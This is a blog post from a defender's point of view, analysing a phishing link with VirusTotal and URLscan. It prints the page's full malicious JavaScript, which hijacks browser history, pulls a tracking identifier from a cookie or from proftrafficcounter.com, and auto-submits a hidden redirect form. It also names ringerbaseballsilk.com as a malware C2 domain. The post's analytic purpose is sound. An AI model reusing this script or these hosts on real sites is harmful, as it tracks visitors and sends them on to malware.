---
layout: post
title: A real case study relates to forensic
description: Analyse a phishing case
tags: [Real Case, Forensic, Virustotal, Command and Control, JavaScript, Blue Team]
---
This is a new kind of post in my blog, it concentrates on real case about forensic and how I investigate it. I'm sure that it can help you know more about attacking techniques and ways to detect it. OK let's start!
First of all, a man sent me a link that's the main reason for this post:<br>
![]({{site.url}}/assets/images/casestudy/2.png)<br>

With my experience, the first thing I had to do when I met a link is... upload it to Virustotal which is a tool to check if a link or a file is malicious or not:<br>
![]({{site.url}}/assets/images/casestudy/3.png)<br>
You can see easily that it still had 2/91 scores, so it's not good at all. Continously, I check deeper by using URLscan because from here I can see all requests from this link: what file it used, how many requests occured?...:<br>
![]({{site.url}}/assets/images/casestudy/1.png)<br>

Now you can see all files that the link interacted, and now my mission is get all files to my local machine and then continute to analyse:<br>
![]({{site.url}}/assets/images/casestudy/4.png)<br>
(You can see in the picture there are 2 files PHP and one picture file, but actually when I analysed it, it had the same content, so I just show you one of the 3 files here):<br>
```
<html>
<head>
<meta charset="utf-8" />
</head>
<body>

    <script type="text/javascript">
            (function (d, w, h) {
                            var reverseUrl = '//' + location.host + '/bmwk9syrqd?key=a969ca5c9ad2611762f11b79a526e2d2&submetric=17641579';
                            h.pushState(null, document.title, reverseUrl);
                h.pushState(null, document.title, reverseUrl);
            })(document, window, history);
    </script>


<form action="/api/users" method="get" id="submit-form">
            <input type="hidden" name="token" value="L2Jtd2s5c3lycWQ_a2V5PTI3NjAxZjA1YjJmM2E2MmQ4ZjAzNzlmZjU0YWU2Y2I0JnBzdD0xNzAzMDY4MDk4JnJtdGM9dCZzaHU9MzZjM2JjMTdkMzc2Nzg1N2QwMmNkYjY1Y2ZhNWYyNGNkNjdlM2RiNDYxMDhiOTU1YmEyYzQwNzZiYjIwNWM1ZWUzZGY0NmExNmUzYzZmOTI1MDJiMDVjNmUzM2QyOGE5N2UwZDA0MWY1YmE3MDExY2Q3NTQ2MWRiM2MxOWFmMjk0M2UxZGE2MjFhMGI1YzBjYjc5ZDk2MTc1ZGVkMDNjZjAyNmZmNg=="/>
            <input type="hidden" name="uuid" value=""/>
            <input type="hidden" name="pii" value=""/>
            <input type="hidden" name="in" value=""/></form>
<script type="text/javascript">
             try{
            if (window.opener !=null){
              if (window.opener.opener !=null){
                window.opener.opener = null;
              }
              window.opener = null;
            }
            if (parent.window.opener != null){
              parent.window.opener = null;
            }
          }
          catch(_e){}
            function now() {
                try {
                    return Date.now();
                } catch (ex) {
                    return (new Date()).getTime();
                }
            }
                        function set(name, value) {document.forms[0]["" + name].value = value;}
            
            function submit(incognito) {
                set("in", incognito);
                
                document.forms[0].submit();
            }

            function redirect() { submit("false"); }

            var date = new Date(now() + 15 * 1000),
                cookies = document.cookie,
                start = cookies.indexOf("uid_id2="),
                isPopunder = true;

            document.cookie = "cjs=t; path=/; expires=" + date.toUTCString();
            isPopunder && window !== top && set("pii", "true");

            if (start === 0 || (start > 0 && (cookies.charAt(start - 1) === ';' || cookies.charAt(start - 1) === ' '))) {
                var finish = cookies.indexOf(';', start);
                set("uuid", cookies.substring(start + 8, finish === -1 ? void 0 : finish));
                redirect();
            } else {
                try {
                    var request = new XMLHttpRequest(),
                        timeout = setTimeout(function() {request.abort();}, 50);
                    request.withCredentials = true;
                    request.open("GET", "https://proftrafficcounter.com/stats");

                    request.onload = function() {
                        clearTimeout(timeout);
                        set("uuid", request.responseText);
                        redirect();
                    };
                    request.onerror = request.onabort = redirect;
                    request.send();
                } catch (error) {
                    redirect();
                }
            }</script>
</body></html>
``` 
This is the source code of PHP file, but you can see inside it it's JavaScript, which is very suspicious, and let's analyse step by step:

1. History Manipulation:
- The JavaScript uses the **history.pushState()** method to modify the browser history. It pushes a new state with a URL constructed from the current host and specific query parameters.
2. Form Submission:
- There's an HTML form (**'<form>'**) with hidden input fields. These fields seem to hold sesitive information such as a token, UUID, and PII (Personally Identifiable Information). The form appears to submit data to an endpoint **'/api/users'** via the GET method.
3. Window Handling:
- The code tries to manipulate the window and opener properties, attempting to nullify them. This might be an attempt to prevent certain actions from being performed or to restrict the ability to track the source windows.
4. Cookie Manipulation:
- It creates a new cookie  named "cjs" with a value of "t" and an expiration time st to 15 seconds from the current time.
5. Conditional Logic:
- Check if the cookie "uid_id2" exists and extracts its value to set the "uuid" field in the form. If successful, it triggers a redirection (**'redirect()'** function). If not, it tries to send a GET request to "https://proftrafficcounter.com/stats" to gather the UUID.
6. XHR Requests:
- It attempts to make an XMLHttpRequest to a remote server to retrieve data. On a successful response, it extracts information and triggers a redirection.
7. Error Handling:
- There are try-catch blocks that handle errors without throwing them explicitly.
8. Functions:
- There are serveral helper functions defined within the script toset values in the form and trigger form submission.

Moreover, let's return to previous image and you notice that when I downloaded files, the first domain wasn't the source of file, instead it's **ringerbaseballsilk.com**. Check it with Virustotal and I saw that it's the C2 server of some Android malwares:<br>
![]({{site.url}}/assets/images/casestudy/5.png)<br>

Conclusion, after analysing, I can be sure that this is the phishing link and I hope everyone will announce to all people around you to help them prevent from it. Thank you very much for reading my blog, if you have any questions about my post, please contact me through Facebook which I attached in home page. Have a good day, peace!
